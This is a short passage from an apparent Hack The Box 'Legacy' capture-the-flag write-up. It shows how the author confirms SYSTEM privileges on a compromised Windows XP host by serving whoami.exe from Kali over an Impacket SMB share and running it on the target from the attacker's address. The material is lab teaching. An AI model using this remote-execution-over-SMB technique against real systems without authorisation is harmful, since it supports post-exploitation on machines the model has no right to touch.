@@ -1,0 +1,38 @@
+Beyond Root - Whoami
+https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+
+XP doesn’t have a whoami binary or command! So while I suspected that I was system with both of these exploits, how would I know:
+
+C:\WINDOWS\system32>whoami
+Whoami'whoami' is not recognized as an internal or external command,
+operable program or batch file.
+
+For most users, I can use echo and the %username% environment variable:
+
+C:\WINDOWS\system32>echo %username%
+%username%
+
+The fact that that environment variable doesn’t expand is a good sign that I’m system. If I want to go further, I can use whoami.exe, which is already on kali by default:
+
+root@kali# locate whoami.exe
+/usr/share/windows-binaries/whoami.exe
+
+I’ll just share that folder over SMB with the command:
+
+root@kali# smbserver.py a /usr/share/windows-binaries/
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8…
+[*] Callback added for UUID 6BFFD098…
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+
+Now I’ll run it and see I’m system:
+
+C:\WINDOWS\system32>\\10.10.14.14\a\whoami.exe
+NT AUTHORITY\SYSTEM
+
+Of course there are other ways I could check, like having access to write in certain places (system32 for example). Getting whoami.exe is certainly one of the easiest and most definitive methods.
